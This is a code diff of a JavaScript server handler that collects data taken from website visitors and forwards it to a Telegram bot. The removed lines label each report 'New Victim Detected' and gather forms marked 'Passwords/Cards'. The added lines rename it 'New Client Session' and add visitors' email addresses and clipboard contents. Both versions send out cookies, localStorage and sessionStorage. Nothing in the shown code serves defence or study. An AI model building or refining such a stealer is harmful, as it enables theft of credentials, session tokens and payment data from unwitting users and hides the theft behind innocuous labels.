@@ -5,41 +5,27 @@ export default async function handler(req, res) {
 
   try {
     let data;
-    
-    // Handle different payload formats
     if (req.body && typeof req.body === 'object') {
       data = req.body;
     } else {
-      // Fallback for raw byte streams (sometimes sent by sendBeacon)
-      try {
-        const raw = req.rawBody || req.body;
-        data = JSON.parse(raw);
-      } catch (e) {
-        data = {};
-      }
+      data = JSON.parse(req.body || "{}");
     }
 
-    // Format LocalStorage nicely for Telegram
-    const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1000);
-    const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1000);
+    // Format for Telegram Markdown
+    const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1500);
+    const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1500);
     
-    // Format Forms (Passwords/Cards)
-    const formsStr = data.forms ? data.forms.map(f => 
-      `Form: ${f.action} (${f.method})\nInputs: ${JSON.stringify(f.inputs)}`
-    ).join('\n---\n') : "No Forms Detected";
+    const msg = `
+🚗 *New Client Session*
 
-    const message = `
-🔓 *New Victim Detected*
-
-🆔 IP: \`${data.ip}\`
-🌐 URL: ${data.location}
-🖥️ UA: ${data.userAgent.substring(0, 60)}...
-💻 Platform: ${data.platform}
+🆔 Email: \`${data.email || "N/A"}\`
+🌐 IP: \`${data.ip}\`
+🖥️ UA: ${data.userAgent.substring(0, 50)}...
 🍪 Cookies: \`${data.cookies || "N/A"}\`
-💾 LocalStorage: \`${lsStr}\`
-🗄️ SessionStorage: \`${ssStr}\`
-📝 Forms/Data: \`${formsStr.substring(0, 1000)}\`
-📱 Screen: ${data.screenRes || "N/A"}
+💾 LocalStorage: \`\`\`json\n${lsStr}\n\`\`\`
+🗄️ SessionStorage: \`\`\`json\n${ssStr}\n\`\`\`
+📋 Clipboard: \`${data.clipboard || "Empty"}\`
+📍 Location: ${data.location}
     `.trim();
 
     const tgToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -52,12 +38,12 @@ export default async function handler(req, res) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             chat_id: tgChatId, 
-            text: message, 
+            text: msg, 
             parse_mode: 'Markdown' 
           })
         });
       } catch (err) {
-        console.error("TG Send Failed", err);
+        console.error("TG Failed", err);
       }
     }
 
